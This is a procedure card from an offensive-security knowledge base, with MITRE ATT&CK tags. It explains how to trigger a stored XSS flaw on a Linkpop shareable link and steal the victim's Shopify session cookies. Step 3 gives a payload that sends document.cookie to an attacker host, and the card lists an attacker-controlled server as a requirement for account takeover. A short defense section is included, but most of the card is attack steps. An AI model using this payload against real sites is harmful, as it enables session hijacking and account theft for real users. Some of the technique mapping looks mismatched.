---
id: proc-linkpop-trigger-exfil-001
tags:
  - exfiltration
  - cookie-theft
  - js-execution
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Archive via Utility]]'
updated_at: '2025-12-13T23:52:44.401Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive via Utility]]'
---
# Trigger-XSS-and-Exfiltrate-Cookies

## Summary

This procedure demonstrates visiting the malicious Linkpop link to trigger the stored XSS payload, executing JavaScript in the victim's browser to exfiltrate cookies and potentially bypass security policies like CORS or SOP.

## Description

Once a victim accesses the shareable link, interacting with elements (e.g., clicking an image) executes the injected JavaScript, such as alert(document.domain) for proof-of-concept or advanced payloads to send document.cookie to an attacker server. Impacts include stealing session tokens like _shopify_y, enabling account takeovers or further actions on Shopify platforms. Tested in browsers like Firefox, this relies on the lack of server-side output encoding.

## Requirements

1. Malicious shareable link from previous steps
2. Victim browser (e.g., Firefox) without strict CSP enforcement
3. Attacker-controlled server for receiving exfiltrated data

## Defense

Defensive measures and detection strategies:

- Output encode all user-generated content on render (e.g., escape HTML/JS contexts)
- Deploy browser-based protections like XSS auditors or extensions
- Monitor for anomalous outbound requests from client-side scripts to unknown domains

## Objectives

1. Execute arbitrary JavaScript in victim context
2. Exfiltrate sensitive data like cookies tied to Shopify sessions
3. Demonstrate potential for escalated impacts like account modifications

## Instructions

### Step 1: Visit Malicious Link

**Context**: Load the tainted page in a browser to prepare for execution.

Open the shareable link (e.g., https://linkpop.com/testnaglinagli) in Firefox or similar.

> The page renders with the stored payload embedded in elements like links or images.

### Step 2: Interact to Trigger Payload

**Context**: Cause the JavaScript to run by user action.

Click on an interactive element, such as the first image, to fire the event handler with the XSS code.

> Observe an alert (e.g., document.domain) or external script load confirming execution.

### Step 3: Exfiltrate Data

**Context**: Modify and capture sensitive information.

Use a payload like <script>fetch('https://attacker.com?cookie='+document.cookie)</script> to send cookies including identity-state, _hjFirstSeen, _y, _shopify_y to your server.

> Verify receipt on the attacker endpoint; note Shopify-linked cookies for potential hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive via Utility]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- exfiltration
- cookie-theft
- js-execution
